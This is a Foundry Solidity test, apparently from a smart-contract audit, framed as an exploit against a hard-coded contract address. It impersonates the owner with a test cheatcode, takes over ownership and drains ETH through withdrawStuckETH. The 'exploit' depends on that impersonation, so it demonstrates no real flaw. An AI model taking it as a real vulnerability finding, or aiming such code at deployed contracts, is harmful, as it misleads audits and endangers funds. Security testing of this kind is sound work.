// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function withdrawStuckETH() external;
    function balanceOf(address account) external view returns (uint256);
    function transferOwnership(address newOwner) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        owner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Send some ETH to the contract to create a balance
        deal(TARGET, 10 ether);

        // Store initial balance for verification
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the owner address
        address currentOwner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        vm.label(currentOwner, "Contract Owner");

        // Store initial balance for verification
        uint256 currentInitialBalance = address(this).balance;

        // Step 1: Impersonate owner and transfer ownership to attacker
        vm.prank(currentOwner);
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).transferOwnership(attacker);

        // Verify we are now the owner
        address newOwner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        require(newOwner == attacker, "Ownership transfer failed");

        // Send some ETH to the contract to create a balance
        deal(TARGET, 10 ether);

        // Step 2: As the new owner, call withdrawStuckETH to drain ETH
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).withdrawStuckETH();

        // Verify our balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, currentInitialBalance, "ETH balance should have increased");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
